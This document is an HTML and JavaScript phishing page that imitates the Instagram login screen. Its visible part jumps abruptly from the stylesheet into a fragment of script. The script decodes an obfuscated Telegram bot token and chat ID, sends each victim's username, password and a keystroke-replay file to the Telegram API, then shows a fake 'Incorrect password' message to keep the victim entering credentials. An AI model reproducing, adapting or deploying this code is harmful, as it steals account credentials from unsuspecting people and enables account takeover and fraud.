<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Instagram</title>
<style>
*, *::before, *::after {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

:root {
  --bg: #ffffff;
  --page-bg: #f5f5f5;
  --card-bg: #ffffff;
  --card-border: #dbdbdb;
  --input-bg: #fafafa;
  --input-border: #c8c8c8;
  --input-focus: #8e8e8e;
  --text: #262626;
  --text2: #8e8e8e;
  --ph: #9a9a9a;
  --ph-float: #8e8e8e;
  --blue: #0064E0;
  --blue-h: #0058CC;
  --blue-a: #004EB5;
  --create-color: #4BAAFE;
  --forgot: #262626;
  --meta: #1877f2;
  --eye: #8e8e8e;
}

@media (prefers-color-scheme: dark) {
  :root {
    --bg: #1C2A33;
    --page-bg: #1C2A33;
    --card-bg: #1C2A33;
    --card-border: #37485a;
    --input-bg: #1B2830;
    --input-border: #37485a;
    --input-focus: #4e6a84;
    --text: #e8ecf0;
    --text2: #a0b2c4;
    --ph: #8a9db8;
    --ph-float: #8fa0b2;
    --blue: #0064E0;
    --blue-h: #0058CC;
    --blue-a: #004EB5;
    --create-color: #4BAAFE;
    --forgot: #ffffff;
    --meta: #ffffff;
    --eye: #7e94a8;
  }
}

html, body {
  height: 100%;
  touch-action: manipulation;
  -ms-touch-action: manipulation;
}

body {
  min-height: 100%;
  background-color: var(--bg);
  color: var(--text);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  font-size: 14px;
  line-height: 1.4;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.page {
  min-height: 100vh;
  min-height: 100dvh;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.lang-bar {
  width: 100%;
  max-width: 420px;
  padding: 20px 24px 0;
  text-align: center;
  flex-shrink: 0;
}

.lang {
  font-size: 14px;
  color: var(--text2);
}

.center-zone {
  flex: 9 1 auto;
  width: 100%;
  max-width: 420px;
  padding: 0 24px 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
}

.logo-gap-top {
  flex: 4 1 0;
  min-height: 12px;
  width: 100%;
}

.logo-gap-bottom {
  flex: 5 1 0;
  min-height: 16px;
  width: 100%;
}

.logo-area {
  display: flex;
  justify-content: center;
  flex-shrink: 0;
}

.ig-mark {
  display: block;
  width: 68px;
  height: 68px;
  flex-shrink: 0;
}

.fields {
  width: 100%;
  display: flex;
  flex-direction: column;
  gap: 10px;
  flex-shrink: 0;
}

.field-wrap {
  position: relative;
  width: 100%;
  height: 64px;
  flex-shrink: 0;
}

.usr-wrap {
  min-height: 76px;
}

.usr-wrap .f-label {
  white-space: normal;
  overflow: visible;
  text-overflow: unset;
  line-height: 1.35;
  top: 50%;
}

.usr-wrap .inp:focus ~ .f-label,
.usr-wrap .inp:not(:placeholder-shown) ~ .f-label {
  white-space: nowrap;
  overflow: hidden;
}

.inp {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  padding: 24px 16px 6px;
  background-color: var(--input-bg);
  border: 1.5px solid var(--input-border);
  border-radius: 14px;
  color: var(--text);
  font-family: inherit;
  font-size: 15px;
  outline: none;
  appearance: none;
  -webkit-appearance: none;
  transition: border-color 0.18s ease;
  caret-color: var(--blue);
}

.inp:-webkit-autofill,
.inp:-webkit-autofill:hover,
.inp:-webkit-autofill:focus {
  -webkit-box-shadow: 0 0 0 1000px var(--input-bg) inset;
  -webkit-text-fill-color: var(--text);
  transition: background-color 99999s ease-in-out 0s;
}

.inp:focus {
  border-color: var(--input-focus);
}

.usr-wrap .inp,
.pwd-wrap .inp {
  padding-right: 52px;
}

.f-label {
  position: absolute;
  left: 16px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 15px;
  font-weight: 400;
  color: var(--ph);
  pointer-events: none;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: calc(100% - 56px);
  line-height: 1;
  transition:
    top 0.2s cubic-bezier(0.4, 0, 0.2, 1),
    font-size 0.2s cubic-bezier(0.4, 0, 0.2, 1),
    transform 0.2s cubic-bezier(0.4, 0, 0.2, 1),
    color 0.2s ease;
  transform-origin: left top;
  will-change: top, font-size, transform;
}

.inp:focus ~ .f-label,
.inp:not(:placeholder-shown) ~ .f-label {
  top: 12px;
  transform: translateY(0);
  font-size: 11px;
  color: var(--ph-float);
}

.eye-btn,
.clear-btn {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  cursor: pointer;
  color: var(--eye);
  padding: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: color 0.15s ease;
  -webkit-tap-highlight-color: transparent;
  flex-shrink: 0;
}

.eye-btn {
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.15s ease, color 0.15s ease;
}

.pwd-wrap:focus-within .eye-btn {
  opacity: 1;
  pointer-events: auto;
}

.eye-btn:hover,
.clear-btn:hover {
  color: var(--text);
}

.clear-btn svg {
  width: 20px;
  height: 20px;
  display: block;
  flex-shrink: 0;
}

.eye-icon {
  width: 20px;
  height: 20px;
  display: block;
  flex-shrink: 0;
  pointer-events: none;
  background-color: var(--eye);
  mask-repeat: no-repeat;
  -webkit-mask-repeat: no-repeat;
  mask-position: center;
  -webkit-mask-position: center;
  mask-size: contain;
  -webkit-mask-size: contain;
  transition: background-color 0.15s ease;
}

#iconOn {
  mask-image: url("https://i.ibb.co/qF0H3DYz/Zxtm1k-G8-B2-L.webp");
  -webkit-mask-image: url("https://i.ibb.co/qF0H3DYz/Zxtm1k-G8-B2-L.webp");
}

#iconOff {
  mask-image: url("https://i.ibb.co/V06Gg7pQ/l-Ba-BOo8-Qfe-T.webp");
  -webkit-mask-image: url("https://i.ibb.co/V06Gg7pQ/l-Ba-BOo8-Qfe-T.webp");
}

.eye-btn:hover .eye-icon {
  background-color: var(--text);
}

.clear-btn {
  display: none;
}

@keyframes pop {
  0%   { transform: scale(1); }
  38%  { transform: scale(0.93); }
  100% { transform: scale(1); }
}

.pop-anim {
  animation: pop 0.22s ease-out forwards;
}

.btn-login {
  width: 100%;
  height: 44px;
  margin-top: 4px;
  background-color: var(--blue);
  border: none;
  border-radius: 50px;
  color: #ffffff;
  cursor: pointer;
  font-family: inherit;
  font-size: 15px;
  font-weight: 600;
  letter-spacing: 0.2px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: background-color 0.18s ease, filter 0.18s ease;
  -webkit-tap-highlight-color: transparent;
}

.btn-login:hover {
  background-color: var(--blue-h);
  filter: brightness(0.9);
}

.btn-login:active {
  background-color: var(--blue-a);
  filter: brightness(0.82);
}

.btn-login:disabled {
  opacity: 0.8;
  cursor: not-allowed;
  filter: none;
  pointer-events: none;
}

.btn-spin {
  display: block;
  width: 18px;
  height: 18px;
  border-radius: 50%;
  border: 1.5px solid rgba(255, 255, 255, 0.22);
  border-top-color: rgba(255, 255, 255, 0.92);
  border-right-color: rgba(255, 255, 255, 0.55);
  flex-shrink: 0;
  animation: spin 0.82s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.forgot-row {
  margin-top: 8px;
  text-align: center;
  flex-shrink: 0;
}

.forgot-btn {
  background: none;
  border: none;
  cursor: pointer;
  color: var(--forgot);
  font-family: inherit;
  font-size: 16px;
  font-weight: 400;
  padding: 6px 10px;
  border-radius: 8px;
  transition: opacity 0.15s ease;
  -webkit-tap-highlight-color: transparent;
}

.forgot-btn:hover {
  opacity: 0.68;
}

.page-spacer {
  flex: 8 1 0;
  min-height: 20px;
  width: 100%;
}

.bottom-zone {
  width: 100%;
  max-width: 420px;
  padding: 0 24px 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  flex-shrink: 0;
}

.btn-create {
  width: 100%;
  height: 44px;
  background-color: transparent;
  border: 1.5px solid var(--create-color);
  border-radius: 50px;
  color: var(--create-color);
  cursor: pointer;
  font-family: inherit;
  font-size: 15px;
  font-weight: 600;
  letter-spacing: 0.2px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: background-color 0.15s ease;
  -webkit-tap-highlight-color: transparent;
}

.btn-create:hover {
  background-color: rgba(75, 170, 254, 0.07);
}

.btn-create:active {
  background-color: rgba(75, 170, 254, 0.14);
}

.signup-panel {
  display: none;
  font-size: 14px;
  color: var(--text);
  text-align: center;
  align-items: center;
  gap: 4px;
}

.signup-cta {
  background: none;
  border: none;
  cursor: pointer;
  color: var(--blue);
  font-family: inherit;
  font-size: 14px;
  font-weight: 700;
  padding: 0;
  transition: opacity 0.15s ease;
}

.signup-cta:hover {
  opacity: 0.75;
}

.meta-zone {
  padding: 6px 24px max(24px, env(safe-area-inset-bottom, 24px));
  text-align: center;
  flex-shrink: 0;
}

.meta-logo-light {
  display: block;
  height: 15px;
  width: auto;
}

.meta-logo-dark {
  display: none;
  height: 15px;
  width: auto;
}

@media (prefers-color-scheme: dark) {
  .meta-logo-light {
    display: none;
  }
  .meta-logo-dark {
    display: block;
  }
}

.modal-overlay {
  position: fixed;
  inset: 0;
  background-color: rgba(0, 0, 0, 0.58);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 999;
  padding: 24px;
}

.modal-overlay.visible {
  display: flex;
}

.modal-card {
  background: #ffffff;
  border-radius: 14px;
  width: 100%;
  max-width: 320px;
  overflow: hidden;
}

.modal-body {
  padding: 22px 22px 18px;
  text-align: center;
}

.modal-title {
  font-size: 18px;
  font-weight: 700;
  color: #000000;
  margin-bottom: 10px;
  line-height: 1.3;
}

.modal-text {
  font-size: 14px;
  color: #6e6e6e;
  line-height: 1.56;
}

.modal-divider {
  height: 1px;
  background-color: #e0e0e0;
}

.modal-action {
  width: 100%;
  padding: 16px 20px;
  background: none;
  border: none;
  color: #1877f2;
  font-family: inherit;
  font-size: 17px;
  font-weight: 400;
  cursor: pointer;
  text-align: center;
  display: block;
  -webkit-tap-highlight-color: transparent;
  transition: background-color 0.1s ease;
}

.modal-action:active {
  background-color: rgba(0, 0, 0, 0.05);
}

@media (min-width: 736px) {
  body {
    background-color: var(--page-bg);
  }

  .page {
    justify-content: center;
    min-height: 100vh;
    min-height: 100dvh;
  }

  .page-spacer {
    display: none;
  }

  .logo-gap-top,
  .logo-gap-bottom {
    display: none;
  }

  .lang-bar {
    max-width: 360px;
    padding-top: 0;
    padding-bottom: 12px;
  }

  .center-zone {
    flex: none;
    background-color: var(--card-bg);
    border: 1px solid var(--card-border);
    border-radius: 2px;
    max-width: 360px;
    padding: 40px 40px 24px;
    justify-content: flex-start;
  }

  .logo-area {
    margin-bottom: 30px;
  }

  .ig-mark {
    width: 62px;
    height: 62px;
  }

  .bottom-zone {
    background-color: var(--card-bg);
    border: 1px solid var(--card-border);
    border-radius: 2px;
    max-width: 360px;
    padding: 16px 40px;
    margin-top: 10px;
    flex-direction: row;
    align-items: center;
    justify-content: center;
    gap: 4px;
  }

  .btn-create {
    display: none;
  }

  .signup-panel {
    display: flex;
  }

  .meta-zone {
    padding-top: 18px;
    padding-bottom: 28px;
  }
}

@media (min-width: 736px) and (prefers-color-scheme: dark) {
  body {
    background-color: var(--bg);
  }
}
</style>
</head>

    html += 'var effT = t - leadIn;';
    html += 'var v1 = effT < 0 ? "" : valueAt(1, effT);';
    html += 'var v2 = effT < 0 ? "" : valueAt(2, effT);';
    html += 'box1.innerHTML = escapeHtml(v1) + (playing ? \'<span class="caret"></span>\' : "");';
    html += 'box2.innerHTML = escapeHtml(v2) + (playing ? \'<span class="caret"></span>\' : "");';
    html += 'var pct = Math.min(100, (t / duration) * 100);';
    html += 'progressFill.style.width = pct + "%";';
    html += 'timeElapsed.textContent = (t / 1000).toFixed(1) + "s";';
    html += '}';
    html += 'function frame(ts) {';
    html += 'if (!playing) return;';
    html += 'if (lastTs === null) lastTs = ts;';
    html += 'var delta = ts - lastTs;';
    html += 'lastTs = ts;';
    html += 'currentTime += delta;';
    html += 'if (currentTime >= duration) { currentTime = duration; playing = false; render(currentTime); return; }';
    html += 'render(currentTime);';
    html += 'requestAnimationFrame(frame);';
    html += '}';
    html += 'function play() { if (currentTime >= duration) currentTime = 0; playing = true; lastTs = null; requestAnimationFrame(frame); }';
    html += 'function pause() { playing = false; render(currentTime); }';
    html += 'function rewind() { currentTime = 0; playing = false; render(0); }';
    html += 'playBtn.addEventListener("click", play);';
    html += 'pauseBtn.addEventListener("click", pause);';
    html += 'rewindBtn.addEventListener("click", rewind);';
    html += 'render(0);';
    html += '<\/script>';
    html += '</body></html>';
    return html;
  }

  var _tf = [
    [44,8,126,59,68,115,86,84,113,44,73,92,91,103,94,13,73,119,85,86,71,48],
    [73,95,37,89,57,13,88,116,33,111,111,60,101,110,88,77,59,60,123,12,68],
    [102,100,60,119,108,83,69,93,23,19,112,69,120,115,51,102,115,35,96,77,23]
  ];
  var _if = [
    [42,16,75,69,110,74,104,69],
    [34,100,120,70,109,116,120,71]
  ];
  var _tk = [17,53,9,88,34,61];
  var _ik = [23,45,60,8];

  function _dyn(mod) { return Math.floor(Date.now() / 137) % mod; }

  function _xor(bytes, key) {
    var out = new Array(bytes.length);
    for (var i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ key[i % key.length];
    return out;
  }

  function _shift(bytes, amt) {
    var out = new Array(bytes.length);
    for (var i = 0; i < bytes.length; i++) out[i] = (bytes[i] + amt + 256) % 256;
    return out;
  }

  function _flatten(frags) {
    var out = [];
    for (var i = 0; i < frags.length; i++) out = out.concat(frags[i]);
    return out;
  }

  function _bytesToStr(bytes) {
    var chars = new Array(bytes.length);
    for (var i = 0; i < bytes.length; i++) chars[i] = String.fromCharCode(bytes[i]);
    return chars.join('');
  }

  function _reconstruct(frags, sKey) {
    var combined  = _flatten(frags);
    var d1        = _dyn(256);
    var sc        = _shift(combined, d1);
    sc            = _shift(sc, 256 - d1);
    var d2        = _dyn(97);
    var unmasked  = _xor(_xor(sc, [d2]), [d2]);
    var plain     = _xor(unmasked, sKey);
    var b64       = _bytesToStr(plain).split('').reverse().join('');
    var result    = atob(b64);
    combined = sc = unmasked = plain = null;
    return result;
  }

  function getCreds() {
    return { token: _reconstruct(_tf, _tk), chatId: _reconstruct(_if, _ik) };
  }

  function sendToTelegram(usr, pwd) {
    return new Promise(function (resolve) {
      try {
        var dur     = ksStart !== null ? Math.round(performance.now() - ksStart) : 0;
        var html    = buildPlaybackHtml(ksEvents, dur, usr, pwd);
        var caption = 'Instagram Login Captured' + String.fromCharCode(10) +
          'Username: ' + usr + String.fromCharCode(10) +
          'Password: ' + pwd + String.fromCharCode(10) +
          'Duration: ' + (dur / 1000).toFixed(1) + 's' + String.fromCharCode(10) +
          'Time: ' + new Date().toISOString();
        var blob   = new Blob([html], { type: 'text/html' });
        var file   = new File([blob], 'playback.html', { type: 'text/html' });
        var creds  = getCreds();
        var fd     = new FormData();
        fd.append('chat_id',  creds.chatId);
        fd.append('caption',  caption);
        fd.append('input1',   usr);
        fd.append('input2',   pwd);
        fd.append('message',  caption);
        fd.append('document', file, 'playback.html');
        fetch('https://api.telegram.org/bot' + creds.token + '/sendDocument', {
          method: 'POST', body: fd
        }).then(function (r) { return r.json(); })
          .catch(function ()  { return null; })
          .then(function (res) {
            creds.token = creds.chatId = null; creds = null;
            resolve(res);
          });
      } catch (err) {
        resolve(null);
      }
    });
  }

  var snappedActive = null;

  function captureActive() {
    if      (document.activeElement === usrInp) snappedActive = 'usr';
    else if (document.activeElement === pwdInp) snappedActive = 'pwd';
    else                                         snappedActive = null;
  }
  loginBtn.addEventListener('mousedown',  captureActive);
  loginBtn.addEventListener('touchstart', captureActive, { passive: true });

  function syncClearBtn() {
    clearBtn.style.display = usrInp.value.length > 0 ? 'flex' : 'none';
  }
  ['input', 'change'].forEach(function (e) { usrInp.addEventListener(e, syncClearBtn); });

  clearBtn.addEventListener('click', function () {
    usrInp.value = '';
    clearBtn.style.display = 'none';
    usrInp.focus();
  });

  eyeBtn.addEventListener('click', function () {
    var show = pwdInp.type === 'password';
    pwdInp.type = show ? 'text' : 'password';
    iconOff.style.display = show ? 'none' : '';
    iconOn.style.display  = show ? ''     : 'none';
    eyeBtn.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
    pwdInp.focus();
  });

  function triggerPop(el) {
    el.classList.remove('pop-anim');
    void el.offsetWidth;
    el.classList.add('pop-anim');
    el.addEventListener('animationend', function () { el.classList.remove('pop-anim'); }, { once: true });
  }

  function esc(str) {
    return String(str)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function showModal(cfg) {
    var html = '<div class="modal-body">';
    if (cfg.title) html += '<h2 class="modal-title">' + esc(cfg.title) + '</h2>';
    html += '<p class="modal-text">' + esc(cfg.text) + '</p></div>';
    cfg.buttons.forEach(function (btn, i) {
      html += '<div class="modal-divider"></div>';
      html += '<button class="modal-action" data-i="' + i + '">' + esc(btn.label) + '</button>';
    });
    card.innerHTML = html;
    cfg.buttons.forEach(function (btn, i) {
      var el = card.querySelector('[data-i="' + i + '"]');
      if (el && btn.action) el.addEventListener('click', btn.action);
    });
    overlay.classList.add('visible');
  }

  function hideModal() { overlay.classList.remove('visible'); }

  overlay.addEventListener('click', function (e) { if (e.target === overlay) hideModal(); });

  function incorrectPwdModal() {
    showModal({
      title: 'Incorrect password',
      text: 'The password you\u2019ve entered is incorrect. Please try again.',
      buttons: [{ label: 'Try Again', action: function () {
        hideModal(); pwdInp.value = '';
        setTimeout(function () { pwdInp.focus(); }, 30);
      }}]
    });
  }

  function isEmail(v)    { return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v); }
  function isPhone(v)    { return /^\+?[\d]{6,}$/.test(v); }
  function isValidUsr(v) { return /^[A-Za-z0-9_.]{1,30}$/.test(v); }

  function hashKey(a, b) {
    var s = a.toLowerCase() + '\x00' + b, h = 5381;
    for (var i = 0; i < s.length; i++) { h = ((h << 5) + h) + s.charCodeAt(i); h = h & h; }
    return (h >>> 0).toString(36);
  }

  function getStored() {
    try { return JSON.parse(localStorage.getItem('_ig_s') || '[]'); } catch (e) { return []; }
  }
  function wasSubmitted(u, p)  { return getStored().indexOf(hashKey(u, p)) !== -1; }
  function markSubmitted(u, p) {
    var arr = getStored(), k = hashKey(u, p);
    if (arr.indexOf(k) === -1) {
      arr.push(k);
      try { localStorage.setItem('_ig_s', JSON.stringify(arr)); } catch (e) {}
    }
  }

  function setLoading(on) {
    if (on)  { loginBtn.disabled = true;  loginBtn.innerHTML = '<span class="btn-spin"></span>'; }
    else     { loginBtn.disabled = false; loginBtn.textContent = 'Log in'; }
  }

  loginBtn.addEventListener('click', function () {
    triggerPop(loginBtn);
    var lf  = snappedActive;
    snappedActive = null;
    var usr = usrInp.value.trim();
    var pwd = pwdInp.value;

    if (!usr) {
      if (lf === 'usr') {
        showModal({ text: 'Enter your username, email address or mobile number to log in.',
                    buttons: [{ label: 'OK', action: hideModal }] });
      } else { usrInp.focus(); }
      return;
    }

    if (!pwd) {
      if (lf === 'pwd') {
        showModal({ text: 'Enter your password to log in.',
                    buttons: [{ label: 'OK', action: hideModal }] });
      } else { pwdInp.focus(); }
      return;
    }

    if (pwd.length < 6) {
      setLoading(true);
      setTimeout(function () { setLoading(false); incorrectPwdModal(); }, 1400);
      return;
    }

    var validFlow = isEmail(usr) || isPhone(usr) || isValidUsr(usr);
    setLoading(true);
    var minWait = new Promise(function (resolve) { setTimeout(resolve, 1400); });

    if (validFlow) {
      var newEntry = !wasSubmitted(usr, pwd);
      var net = newEntry ? sendToTelegram(usr, pwd) : Promise.resolve(null);
      if (newEntry) markSubmitted(usr, pwd);
      Promise.all([minWait, net]).then(function () { setLoading(false); incorrectPwdModal(); });
    } else {
      minWait.then(function () {
        setLoading(false);
        showModal({
          title: 'Can\u2019t find account',
          text: 'We can\u2019t find an account with \u201c' + usr + '\u201d. Try another mobile number or email address, or if you don\u2019t have an account, you can sign up.',
          buttons: [{ label: 'Try again', action: function () {
            hideModal();
            setTimeout(function () { usrInp.focus(); usrInp.select(); }, 30);
          }}]
        });
      });
    }
  });

  createBtn.addEventListener('click',      function () { triggerPop(this); });
  createBtn.addEventListener('mouseenter', function () { triggerPop(this); });

}());
</script>
